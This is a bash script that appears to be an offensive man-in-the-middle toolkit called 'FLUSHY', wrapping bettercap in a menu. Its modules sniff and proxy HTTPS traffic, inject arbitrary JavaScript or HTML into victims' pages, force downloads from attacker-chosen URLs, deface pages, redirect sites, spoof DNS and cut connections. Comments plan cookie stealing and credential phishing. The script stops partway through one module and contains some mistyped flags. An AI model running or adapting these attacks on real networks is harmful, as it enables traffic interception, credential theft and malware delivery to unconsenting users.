#!/bin/bash


#FLUSHY
#Author: Shellbear
#Version: 1.0
#https://github.com/shellbear


# DEPENDENCIES:
# required: bettercap, bettercap proxy-modules, nmap
#https://github.com/evilsocket/bettercap
#https://github.com/evilsocket/bettercap-proxy-modules
#https://nmap.org/book/inst-macosx.html


#CREDITS:
#Bettercap : https://www.bettercap.org/
#Nmap : https://nmap.org/
#chrismcmorran : https://github.com/chrismcmorran/dSniff-Pre-Compiled-MacOS
#Dnsiff : https://www.monkey.org/~dugsong/dsniff/
#WifiPhisher : https://github.com/wifiphisher/wifiphisher


#TO DO http://hackiteasy.bLogspot.fr/2011/01/session-hijacking-or-cookie-stealing.html localhost:8081/cookielogger... Steal cookies session
#Phishing : python /Users/shellbear/flushy/server.py facebook / gmail
#sudo kill $(ps ax | grep bettercap | head -1 | grep -Eo '[0-9]{5,5}')
#sudo bettercap --proxy-module injectjs --js-data "alert('Testing');"


#Background commands (run multiple commands at same time)
#Last executed : echo $!
#bettercap > background & echo $! >>/Ressources/pid
#tail -f background
#trap.sh kill pid
#config : interface (en0/$interface) / Arp Spoofer (Bettercap/Arpspoof)
#sudo sysctl -w net.inet.ip.forwarding=1
#sudo sysctl -w net.inet.ip.fw.enable=1



#Server osx
#sudo apachectl start
#sudo apachectl stop
#/Library/WebServer/Documents/


#INJECT BACKGROUND SOUNDCLOUD MUSIC
#Variable : $souncloud
#cat <<EOF > "$script_dir/Ressources/soundcloud.html"
#<iframe width="0%" height="450" scrolling="no" frameborder="no" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/$(curl -s $soundcloud | grep -o '"embedUrl" content="https://w.soundcloud.com/player/?url=http[^ ]*' | grep -oE '[0-9]{9}')&amp;auto_play=true&amp;hide_related=false&amp;show_comments=true&amp;show_user=true&amp;show_reposts=false&amp;visual=true"></iframe>
#EOF

  function ctrl_c() {
    echo
    echo
    echo -e "$(print_error "User has canceled (ctrl+c)")"
    echo
killall php > /dev/null 2>&1
killall Python > /dev/null 2>&1
exit 1
}

trap ctrl_c INT


#Check if script is running as root
if [ "$EUID" -ne 0 ]
  then echo "Please run as root"
  exit
fi

#Check OS

if [[ "$OSTYPE" == "linux-gnu" ]]; then
        os="linux"
        interface=$(ip route get 8.8.8.8 | awk '{ print $5; exit }')
        local=$(ipconfig getifaddr $interface)
        gateway=$(/sbin/ip route | awk '/default/ { print $3 }')
elif [[ "$OSTYPE" == "darwin"* ]]; then
        os="osx"
        interface=$(ip route get 8.8.8.8 | awk '{ print $5; exit }')
        local=$(ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1')
        gateway=$(route -n get default | grep -Eo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}')
fi


#Variable declarations
script_dir=$(pwd)
cd $script_dir
mkdir -p Ressources
mkdir -p Logs
user=$(echo $script_dir | cut -d "/" -f3)


function print_good ()
{
	echo "\x1B[01;32m[*]\x1B[0m $1"
}


function print_error ()
{
	echo "\x1B[01;31m[*]\x1B[0m $1"
}


function print_status ()
{
	echo "\x1B[01;34m[*]\x1B[0m $1"
}



function attack_menu
{
clear
bash $script_dir/banner.sh
number=$(echo $target | tr -cd , | wc -c)
if [[ $target = all ]];then
echo "+--------+"
echo "| Target | "
echo "+--------+"
echo "|   $target  |"
echo "+--------+"
echo
elif [ $number -gt 0 ];then
echo "+-------------+"
echo "|   Targets   | $target"
echo "+-------------+"
echo
else
echo "+--------------+"
echo "|    Target    | "
echo "+--------------+"
echo "| $target |"
echo "+--------------+"
echo
fi
if [[ $last == "help" ]]; then
echo "Main Commands"
echo "============="
echo
echo "    Command       Description"
echo "    -------       -----------"
echo '    set           Define variable '
echo '    help          Display this help menu'
echo '    clear         Clear '
echo '    back          Back'
echo '    exit          Return to Menu'
echo
echo
echo "Modules"
echo "======="
echo
echo "    Command       Description"
echo "    -------       -----------"
echo '    sniff         Sniff Traffic'
if [[ "$OSTYPE" == "linux-gnu" ]]; then
echo '    driftnet      Sniff Images' 
fi
echo '    images        Replace all images with a custom one'
echo '    youtube       Inject an iframe with a youtube video in autoplay mode'
echo '    download      Spoof download'
echo '    injecthtml    Inject custom html script into pages'
echo '    injectjs      Inject custom javascript into pages'
echo '    injectcss     Inject custom css into pages'
echo '    redirect      Redirect any visited website to choosen url'
echo '    kill          Kill connection for selected devices'
echo '    dns           DNS Spoofing'
echo '    title         Add custom title to website'
echo '    noscroll      Puts an invisible div over every HTML page'
echo '    phishing      Steal credentials with phishing pages'
echo '    macof         Flood network with random mac adresses'
echo '    ports         Run a Nmap port scan against target'
echo
last=""
fi
if [ ! -z "$last" ]; then
echo -e "$last"
last=""
echo
fi
if [ ! -z "$set" ]; then
if [ -z $(echo $CHOICE | awk '{print $2;}') ]; then
echo -e "$(print_error 'Please choose a variable: set (interface/spoofer/target) variable')"
set=""
echo
else
eval $(echo $CHOICE | awk '{print $2;}')=$(echo $CHOICE | awk '{print $3;}')
echo "$(echo $CHOICE | awk '{print $2;}') -> $(echo $CHOICE | awk '{print $3;}')"
if [ $(echo $CHOICE | awk '{print $2;}') = "target" ]; then
if [ -z "$(echo $CHOICE | awk '{print $3;}')" ]
  then target=all
  set=""
  attack_menu
else
target=$(echo $CHOICE | awk '{print $3;}')
set=""
attack_menu
fi
fi
set=""
echo
fi
fi
read -p $'\033[0;34m\e[4mFLUSHY\e[0m > ' CHOICE
 [[ $CHOICE = "0" ]]
 case $CHOICE in
help) last="help"
attack_menu
;;
back) main_menu
;;
exit) exit 1
;;
sniff)
echo
echo $'\033[0;32msniff\e[0m - Sniff Traffic'
echo
until [ "$CHOICE" = "exit" ]
do
read -p $'\033[0;31mType run to execute "sniff" command\e[0m : ' CHOICE
case $CHOICE in
run) datee=$(date +%Y_%m_%d_%H:%M:%S)
echo
read -p "Run HTTPS Proxy ? Y/n " https
https=${https:-y}
echo
if [[ "$https" =~ ^[Yy]$ ]]
	then
if echo $target | grep -qoE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'; then
sudo bettercap -I $interface --sniffer --proxy-https -T $target
echo
echo "Log saved at : $script_dir/Logs/$datee.pcap"
echo
else sudo bettercap -I $interface --sniffer --proxy-https
echo
echo "Log saved at : $script_dir/Logs/$datee.pcap"
echo
fi
else
if echo $target | grep -qoE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'; then
sudo bettercap -I $interface --sniffer --proxy -T $target
echo
echo "Log saved at : $script_dir/Logs/$datee.pcap"
echo
else sudo bettercap -I $interface --sniffer --proxy
echo
echo "Log saved at : $script_dir/Logs/$datee.pcap"
echo
fi
fi
;;
help) echo;echo $'\033[0;32mrun\e[0m -  execute command'
echo $'\033[0;32mback\e[0m - return to Menu'
echo $'\033[0;32mexit\e[0m - exit';echo
;;
back) attack_menu
;;
exit) exit 1
;;
*) echo
echo -e "$(print_error 'Invalid command. Type "Help" to see all commands')"
echo
;;
esac
done
;;
download)
echo 'replace_file - Replace downloaded files on the fly with custom ones'
echo 'download_hijack - Redirects the victims downloads with local file'
;;
images)
echo
echo $'\033[0;32mimages\e[0m - Replace all images with a custom one'
echo
until [ "$CHOICE" = "exit" ]
do
cat $script_dir/Ressources/modules/js/goatse.js | sed "s,http://goatse.info/hello.jpg,$url,g" > $script_dir/Ressources/modules/js/url.js
echo
read -p $'\033[0;31mType run to execute "images" command\e[0m : ' CHOICE
case $CHOICE in
run)
echo
read -p "URL of picture : " url
echo
read -p "Run HTTPS Proxy ? Y/n " https
https=${https:-y}
echo
if [[ "$https" =~ ^[Yy]$ ]]
	then
if echo $target | grep -qoE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'; then
sudo bettercap -I $interface --proxy-https --proxy-module injectjs --js-file $script_dir/Ressources/modules/js/url.js -T $target
echo
else sudo bettercap -I $interface --proxy-https --proxy-module injectjs --js-file $script_dir/Ressources/modules/js/url.js
echo
fi
else
if echo $target | grep -qoE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'; then
sudo bettercap -I $interface --proxy-module injectjs --js-file $script_dir/Ressources/modules/js/url.js -T $target
echo
else sudo bettercap -I $interface --proxy-module injectjs --js-file $script_dir/Ressources/modules/js/url.js
echo
fi
fi
;;
help) echo;echo $'\033[0;32mrun\e[0m -  execute command'
echo $'\033[0;32mback\e[0m - return to Menu'
echo $'\033[0;32mexit\e[0m - exit';echo
;;
back) attack_menu
;;
exit) exit 1
;;
*) echo
echo -e "$(print_error 'Invalid command. Type "Help" to see all commands')"
echo
;;
esac
done
;;
youtube)
echo
echo $'\033[0;32myoutube\e[0m - Inject an iframe with a youtube video in autoplay mode'
echo
until [ "$CHOICE" = "exit" ]
do
read -p $'\033[0;31mType run to execute "youtube" command\e[0m : ' CHOICE
case $CHOICE in
run)
echo
read -p "Youtube video ID (e.g. dQw4w9WgXcQ) : " youtube
cat $script_dir/Ressources/modules/rickroll.rb | sed "s,dQw4w9WgXcQ,$youtube,g" > $script_dir/Ressources/modules/youtube.rb
echo
read -p "Run HTTPS Proxy ? Y/n " https
https=${https:-y}
echo
if [[ "$https" =~ ^[Yy]$ ]]
then
if echo $target | grep -qoE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'; then
sudo bettercap -I $interface --proxy-https --proxy-module $script_dir/Ressources/modules/youtube.rb -T $target
echo
else sudo bettercap -I $interface --proxy-https --proxy-module $script_dir/Ressources/modules/youtube.rb
echo
fi
else
if echo $target | grep -qoE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'; then
sudo bettercap -I $interface --proxy-module $script_dir/Ressources/modules/youtube.rb -T $target
echo
else sudo bettercap -I $interface --proxy-module $script_dir/Ressources/modules/youtube.rb
echo
fi
fi
;;
help) echo;echo $'\033[0;32mrun\e[0m -  execute command'
echo $'\033[0;32mback\e[0m - return to Menu'
echo $'\033[0;32mexit\e[0m - exit';echo
;;
back) attack_menu
;;
exit) exit 1
;;
*) echo
echo -e "$(print_error 'Invalid command. Type "Help" to see all commands')"
echo
;;
esac
done
;;
kill)
echo
echo $'\033[0;32mkill\e[0m - Kill connection for selected devices'
echo
until [ "$CHOICE" = "exit" ]
do
read -p $'\033[0;31mType run to execute "kill" command\e[0m : ' CHOICE
case $CHOICE in
run)
if echo $target | grep -qoE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'; then
sudo bettercap -I $interface --kill -T $target
echo
else sudo bettercap -I $interface --kill
echo
fi
;;
help) echo;echo $'\033[0;32mrun\e[0m -  execute command'
echo $'\033[0;32mback\e[0m - return to Menu'
echo $'\033[0;32mexit\e[0m - exit';echo
;;
back) attack_menu
;;
exit) exit 1
;;
*) echo
echo -e "$(print_error 'Invalid command. Type "Help" to see all commands')"
echo
;;
esac
done
;;
noscroll)
echo
echo $'\033[0;32mnoscroll\e[0m - Puts an invisible div over every HTML page'
echo
until [ "$CHOICE" = "exit" ]
do
read -p $'\033[0;31mType run to execute "noscroll" command\e[0m : ' CHOICE
case $CHOICE in
run)
echo
read -p "Run HTTPS Proxy ? Y/n " https
https=${https:-y}
echo
if [[ "$https" =~ ^[Yy]$ ]]
then
if echo $target | grep -qoE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'; then
sudo bettercap -I $interface --proxy-https --proxy-module $script_dir/Ressources/modules/noscroll.rb -T $target
echo
else sudo bettercap -I $interface --proxy-https --proxy-module $script_dir/Ressources/modules/noscroll.rb
echo
fi
else
	if echo $target | grep -qoE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'; then
sudo bettercap -I $interface --proxy-module $script_dir/Ressources/modules/noscroll.rb -T $target
echo
else sudo bettercap -I $interface --proxy-module $script_dir/Ressources/modules/noscroll.rb
echo
fi
fi
;;
help) echo;echo $'\033[0;32mrun\e[0m -  execute command'
echo $'\033[0;32mback\e[0m - return to Menu'
echo $'\033[0;32mexit\e[0m - exit';echo
;;
back) attack_menu
;;
exit) exit 1
;;
*) echo
echo -e "$(print_error 'Invalid command. Type "Help" to see all commands')"
echo
;;
esac
done
;;
injectjs)
echo
echo $'\033[0;32minjectjs\e[0m - Inject custom javascript into pages'
echo
until [ "$CHOICE" = "exit" ]
do
read -p $'\033[0;31mType help to see "injectjs" commands\e[0m : ' CHOICE
case $CHOICE in
file) echo
read -p "Javascript file path : " filee
read -p "Run HTTPS Proxy ? Y/n " https
https=${https:-y}
echo
if [[ "$https" =~ ^[Yy]$ ]]
then
if echo $target | grep -qoE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'; then
sudo bettercap -I $interface --proxy-https --proxy-module injectjs --js-file $filee -T $target
echo
else
sudo bettercap -I $interface --proxy-https --proxy-module injectjs --js-file $filee
echo
fi
else
	if echo $target | grep -qoE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'; then
sudo bettercap -I $interface --proxy-module injectjs --js-file $filee -T $target
echo
else
sudo bettercap -I $interface --proxy-module injectjs --js-file $filee
echo
fi
fi
;;
shake) echo
read -p "Run HTTPS Proxy ? Y/n " https
https=${https:-y}
echo
if [[ "$https" =~ ^[Yy]$ ]]
then
if echo $target | grep -qoE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'; then
sudo bettercap -I $interface --proxy-https --proxy-module injectjs --js-file $script_dir/Ressources/modules/js/shakescreen.js -T $target
echo
else
sudo bettercap -I $interface --proxy-https --proxy-module injectjs --js-file $script_dir/Ressources/modules/js/shakescreen.js
echo
fi
else
	if echo $target | grep -qoE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'; then
sudo bettercap -I $interface --proxy-module injectjs --js-file $script_dir/Ressources/modules/js/shakescreen.js -T $target
echo
else
sudo bettercap -I $interface --proxy-module injectjs --js-file $script_dir/Ressources/modules/js/shakescreen.js
echo
fi
fi
;;
download) echo
read -p "Download URL : " url
cat $script_dir/Ressources/modules/js/forcedownload.js | sed "s,http://the.earth.li/\~sgtatham/putty/latest/x86/putty.exe,$url,g" > $script_dir/Ressources/modules/js/download.js
https=${https:-y}
echo
if [[ "$https" =~ ^[Yy]$ ]]
then
if echo $target | grep -qoE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'; then
sudo bettercap -I $interface --proxy-https --proxy-module injectjs --js-file $script_dir/Ressources/modules/js/download.js -T $target
echo
else
sudo bettercap -I $interface --proxy-https --proxy-module injectjs --js-file $script_dir/Ressources/modules/js/download.js.js
echo
fi
else
	if echo $target | grep -qoE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'; then
sudo bettercap -I $interface --proxy-module injectjs --js-file $script_dir/Ressources/modules/js/download.js -T $target
echo
else
sudo bettercap -I $interface --proxy-module injectjs --js-file $script_dir/Ressources/modules/js/download.js
echo
fi
fi
;;
help) echo
echo $'\033[0;32mfile\e[0m -  Inject custom javascript'
echo $'\033[0;32mdownload\e[0m -  Force downloading a file'
echo $'\033[0;32mshake\e[0m -  Shake pages'
echo $'\033[0;32mback\e[0m - return to Menu'
echo $'\033[0;32mexit\e[0m - exit';echo
;;
back) attack_menu
;;
exit) exit 1
;;
*) echo
echo -e "$(print_error 'Invalid command. Type "Help" to see all commands')"
echo
;;
esac
done
;;
injectcss)
echo
echo $'\033[0;32minjectcss\e[0m - Inject custom css into pages'
echo
until [ "$CHOICE" = "exit" ]
do
read -p $'\033[0;31mType help to see "injectcss" commands\e[0m : ' CHOICE
case $CHOICE in
file) echo
read -p "CSS file path : " filee
echo
read -p "Run HTTPS Proxy ? Y/n " https
https=${https:-y}
echo
if [[ "$https" =~ ^[Yy]$ ]]
then
if echo $target | grep -qoE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'; then
sudo bettercap -I $interface --proxy-https --proxy-module injectcss --css-file $filee -T $target
echo
else
sudo bettercap -I $interface --proxy-https --proxy-module injectcss --css-file $filee
echo
fi
else
if echo $target | grep -qoE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'; then
sudo bettercap -I $interface --proxy-module injectcss --css-file $filee -T $target
echo
else
sudo bettercap -I $interface --proxy-module injectcss --css-file $filee
echo
fi
fi
;;
upsidown) echo
read -p "Run HTTPS Proxy ? Y/n " https
https=${https:-y}
echo
if [[ "$https" =~ ^[Yy]$ ]]
then
if echo $target | grep -qoE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'; then
sudo bettercap -I $interface --proxy-https --proxy-module injectcss --css-file $script_dir/Ressources/modules/css/upsidedown.css -T $target
echo
else
sudo bettercap -I $interface --proxy-https --proxy-module injectcss --css-file $script_dir/Ressources/modules/css/upsidedown.css
echo
fi
else
if echo $target | grep -qoE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'; then
sudo bettercap -I $interface --proxy-module injectcss --css-file $script_dir/Ressources/modules/css/upsidedown.css -T $target
echo
else
sudo bettercap -I $interface --proxy-module injectcss --css-file $script_dir/Ressources/modules/css/upsidedown.css
echo
fi
fi
;;
spinimages) echo
read -p "Run HTTPS Proxy ? Y/n " https
https=${https:-y}
echo
if [[ "$https" =~ ^[Yy]$ ]]
then
if echo $target | grep -qoE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'; then
sudo bettercap -I $interface --proxy-https --proxy-module injectcss --css-file $script_dir/Ressources/modules/css/spinimages.css -T $target
echo
else
sudo bettercap -I $interface --proxy-https --proxy-module injectcss --css-file $script_dir/Ressources/modules/css/spinimages.css
echo
fi
else
	if echo $target | grep -qoE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'; then
sudo bettercap -I $interface --proxy-module injectcss --css-file $script_dir/Ressources/modules/css/spinimages.css -T $target
echo
else
sudo bettercap -I $interface --proxy-module injectcss --css-file $script_dir/Ressources/modules/css/spinimages.css
echo
fi
fi
;;
flipimages) echo
read -p "Run HTTPS Proxy ? Y/n " https
https=${https:-y}
echo
if [[ "$https" =~ ^[Yy]$ ]]
then
if echo $target | grep -qoE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'; then
sudo bettercap -I $interface --proxy-https --proxy-module injectcss --css-file $script_dir/Ressources/modules/css/flipimages.css -T $target
echo
else
sudo bettercap -I $interface ---proxy-https -proxy-module injectcss --css-file $script_dir/Ressources/modules/css/flipimages.css
echo
fi
else
if echo $target | grep -qoE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'; then
sudo bettercap -I $interface --proxy-module injectcss --css-file $script_dir/Ressources/modules/css/flipimages.css -T $target
echo
else
sudo bettercap -I $interface --proxy-module injectcss --css-file $script_dir/Ressources/modules/css/flipimages.css
echo
fi
fi
;;
slantpage) echo
read -p "Run HTTPS Proxy ? Y/n " https
https=${https:-y}
echo
if [[ "$https" =~ ^[Yy]$ ]]
then
if echo $target | grep -qoE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'; then
sudo bettercap -I $interface --proxy-https --proxy-module injectcss --css-file $script_dir/Ressources/modules/css/slantpage.css -T $target
echo
else
sudo bettercap -I $interface --proxy-https --proxy-module injectcss --css-file $script_dir/Ressources/modules/css/slantpage.css
echo
fi
else
	if echo $target | grep -qoE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'; then
sudo bettercap -I $interface --proxy-module injectcss --css-file $script_dir/Ressources/modules/css/slantpage.css -T $target
echo
else
sudo bettercap -I $interface --proxy-module injectcss --css-file $script_dir/Ressources/modules/css/slantpage.css
echo
fi
fi
;;
blurpage) echo
read -p "Run HTTPS Proxy ? Y/n " https
https=${https:-y}
echo
if [[ "$https" =~ ^[Yy]$ ]]
then
if echo $target | grep -qoE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'; then
sudo bettercap -I $interface --proxy-https --proxy-module injectcss --css-file $script_dir/Ressources/modules/css/blurpage.css -T $target
echo
else
sudo bettercap -I $interface --proxy-https --proxy-module injectcss --css-file $script_dir/Ressources/modules/css/blurpage.css
echo
fi
else
	if echo $target | grep -qoE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'; then
sudo bettercap -I $interface --proxy-module injectcss --css-file $script_dir/Ressources/modules/css/blurpage.css -T $target
echo
else
sudo bettercap -I $interface --proxy-module injectcss --css-file $script_dir/Ressources/modules/css/blurpage.css
echo
fi
fi
;;
background) echo
read -p "Background picture URL : " picture
echo
cat $script_dir/Ressources/modules/css/background.css | sed "s,https://chuckfeerless.files.wordpress.com/2013/11/yo-wtf-dawg.jpg,$picture,g" > $script_dir/Ressources/modules/css/picture.css
read -p "Run HTTPS Proxy ? Y/n " https
https=${https:-y}
echo
if [[ "$https" =~ ^[Yy]$ ]]
then
if echo $target | grep -qoE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'; then
sudo bettercap -I $interface --proxy-https --proxy-module injectcss --css-file $script_dir/Ressources/modules/css/picture.css -T $target
echo
else
sudo bettercap -I $interface --proxy-https --proxy-module injectcss --css-file $script_dir/Ressources/modules/css/picture.css
echo
fi
else
	if echo $target | grep -qoE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'; then
sudo bettercap -I $interface --proxy-module injectcss --css-file $script_dir/Ressources/modules/css/picture.css -T $target
echo
else
sudo bettercap -I $interface --proxy-module injectcss --css-file $script_dir/Ressources/modules/css/picture.css
echo
fi
fi
;;
help) echo
echo $'\033[0;32mfile\e[0m -  Inject custom javascript'
echo $'\033[0;32mupsidedown\e[0m -  Reverse pages'
echo $'\033[0;32mspinimages\e[0m -  Spin images'
echo $'\033[0;32mflipimages\e[0m -  Flip images'
echo $'\033[0;32mslantpage\e[0m -  Slant page'
echo $'\033[0;32mblurpage\e[0m -  Blur page'
echo $'\033[0;32mbackground\e[0m -  Change Background by custom picture'
echo $'\033[0;32mback\e[0m - return to Menu'
echo $'\033[0;32mexit\e[0m - exit';echo
;;
back) attack_menu
;;
exit) exit 1
;;
*) echo
echo -e "$(print_error 'Invalid command. Type "Help" to see all commands')"
echo
;;
esac
done
;;
redirect) echo
echo $'\033[0;32mredirect\e[0m - Redirect any visited website to choosen url'
echo
until [ "$CHOICE" = "exit" ]
do
read -p $'\033[0;31mType run to execute "redirect" command\e[0m : ' CHOICE
case $CHOICE in
run)
echo; read -p "URL to redirect : " url
echo
read -p "Run HTTPS Proxy ? Y/n " https
https=${https:-y}
echo
if [[ "$https" =~ ^[Yy]$ ]]
then
if echo $target | grep -qoE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'; then
sudo bettercap -I $interface --proxy-https --proxy --proxy-module redirect --redirect-url $url -T $target
echo
else
sudo bettercap -I $interface --proxy-https --proxy --proxy-module redirect --redirect-url $url
echo
fi
else
	if echo $target | grep -qoE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'; then
sudo bettercap -I $interface --proxy --proxy-module redirect --redirect-url $url -T $target
echo
else
sudo bettercap -I $interface --proxy --proxy-module redirect --redirect-url $url
echo
fi
fi
;;
help) echo;echo $'\033[0;32mrun\e[0m -  execute command'
echo $'\033[0;32mback\e[0m - return to Menu'
echo $'\033[0;32mexit\e[0m - exit';echo
;;
back) attack_menu
;;
exit) exit 1
;;
*) echo
echo -e "$(print_error 'Invalid command. Type "Help" to see all commands')"
echo
;;
esac
done
;;
driftnet) if [[ "$OSTYPE" == "linux-gnu" ]]; then
echo
echo $'\033[0;32mdriftnet\e[0m - Sniff Images'
echo
until [ "$CHOICE" = "exit" ]
do
read -p $'\033[0;31mType run to execute "driftnet" command\e[0m : ' CHOICE
case $CHOICE in
run) echo 
read -p "Run HTTPS Proxy ? Y/n " https
https=${https:-y}
echo
if [[ "$https" =~ ^[Yy]$ ]]
then
if echo $target | grep -qoE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'; then
sudo bettercap -I $interface -T $target --proxy-https -X > /dev/null 2>&1 &
driftnet -i $interface
sudo kill $!
else sudo bettercap -I $interface --proxy-https -X > /dev/null 2>&1 &
driftnet -i $interface
sudo kill $!
fi
else 
if echo $target | grep -qoE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'; then
sudo bettercap -I $interface -T $target --proxy -X > /dev/null 2>&1 &
driftnet -i $interface
sudo kill $!
else sudo bettercap -I $interface --proxy -X > /dev/null 2>&1 &
driftnet -i $interface
sudo kill $!
fi
fi
;;
help) echo;echo $'\033[0;32mrun\e[0m -  execute command'
echo $'\033[0;32mback\e[0m - return to Menu'
echo $'\033[0;32mexit\e[0m - exit';echo
;;
back) attack_menu
;;
exit) exit 1
;;
*) echo
echo -e "$(print_error 'Invalid command. Type "Help" to see all commands')"
echo
;;
esac
done
last=$(print_error 'Driftnet command is only available for Kali Linux' )
attack_menu
fi
;;
injecthtml)
echo
echo $'\033[0;32minjecthtml\e[0m - Inject custom html script into pages'
echo
until [ "$CHOICE" = "exit" ]
do
read -p $'\033[0;31mType help to see "injecthtml" commands\e[0m : ' CHOICE
case $CHOICE in
file)
echo
read -p "HTML file path : " html
echo
read -p "Run HTTPS Proxy ? Y/n " https
https=${https:-y}
echo
if [[ "$https" =~ ^[Yy]$ ]]
then
if echo $target | grep -qoE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'; then
sudo bettercap -I $interface --proxy-https -proxy-module injecthtml --html-file $html -T $target
echo
else sudo bettercap -I $interface --proxy-https --proxy-module injecthtml --html-file $html
echo
fi
if echo $target | grep -qoE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'; then
sudo bettercap -I $interface --proxy-module injecthtml --html-file $html -T $target
echo
else sudo bettercap -I $interface --proxy-module injecthtml --html-file $html
echo
fi
fi
;;
deface)
echo
read -p "HTML file path : " html
echo
cat <<EOF > "$script_dir/Ressources/deface.html"
        <script type="text/javascript">
            document.body.innerHTML = '$(cat $html)';
        </script>
EOF
read -p "Run HTTPS Proxy ? Y/n " https
https=${https:-y}
echo
if [[ "$https" =~ ^[Yy]$ ]]
then
if echo $target | grep -qoE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'; then
sudo bettercap -I $interface --proxy-https -proxy-module injecthtml --html-file $script_dir/Ressources/deface.html -T $target
echo
else sudo bettercap -I $interface --proxy-https --proxy-module injecthtml --html-file $script_dir/Ressources/deface.html
echo
fi
if echo $target | grep -qoE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'; then
sudo bettercap -I $interface --proxy-module injecthtml --html-file $script_dir/Ressources/deface.html -T $target
echo
else sudo bettercap -I $interface --proxy-module injecthtml --html-file $script_dir/Ressources/deface.html
echo
fi
fi
;;
back) attack_menu
;;
exit) exit 1
;;
help) echo
echo $'\033[0;32mfile\e[0m -  Inject html code from a file'
echo $'\033[0;32mdeface\e[0m -  Deface and inject html code from a file'
echo $'\033[0;32mback\e[0m - return to Menu'
echo $'\033[0;32mexit\e[0m - exit';echo
;;
*) echo
echo -e "$(print_error 'Invalid command. Type "Help" to see all commands')"
echo
;;
esac
done
;;
dns)
echo
echo $'\033[0;32mdns\e[0m - DNS Spoofing'
echo
until [ "$CHOICE" = "exit" ]
do
read -p $'\033[0;31mType run to execute "dns" command\e[0m : ' CHOICE
case $CHOICE in
run)
echo
read -p "dns.conf file path : " conf
echo
if echo $target | grep -qoE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'; then
sudo bettercap -I $interface --dns $conf -T $target
echo
else sudo bettercap -I $interface --dns $conf
echo
fi
;;
help) echo;echo $'\033[0;32mrun\e[0m -  execute command'
echo $'\033[0;32mback\e[0m - return to Menu'
echo $'\033[0;32mexit\e[0m - exit';echo
;;
back) attack_menu
;;
exit) exit 1
;;
help) echo;echo $'\033[0;32mrun\e[0m -  execute command'
echo $'\033[0;32mback\e[0m - return to Menu'
echo $'\033[0;32mexit\e[0m - exit';echo
;;
*) echo
echo -e "$(print_error 'Invalid command. Type "Help" to see all commands')"
echo
;;
esac
done
;;
title)
echo
echo $'\033[0;32mtitle\e[0m - Add custom title to website'
echo
until [ "$CHOICE" = "exit" ]
do
read -p $'\033[0;31mType run to execute "title" command\e[0m : ' CHOICE
case $CHOICE in
run)
echo
read -p "Title : " title
cat $script_dir/Ressources/modules/hack_title.rb| sed "s,!!! HACKED !!!,$title,g" > $script_dir/Ressources/modules/title.rb
echo
read -p "Run HTTPS Proxy ? Y/n " https
https=${https:-y}
echo
if [[ "$https" =~ ^[Yy]$ ]]
then
if echo $target | grep -qoE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'; then
sudo bettercap -I $interface --proxy-https --proxy-module $script_dir/Ressources/modules/title.rb -T $target
echo
else sudo bettercap -I $interface --proxy-https --proxy-module $script_dir/Ressources/modules/title.rb
echo
fi
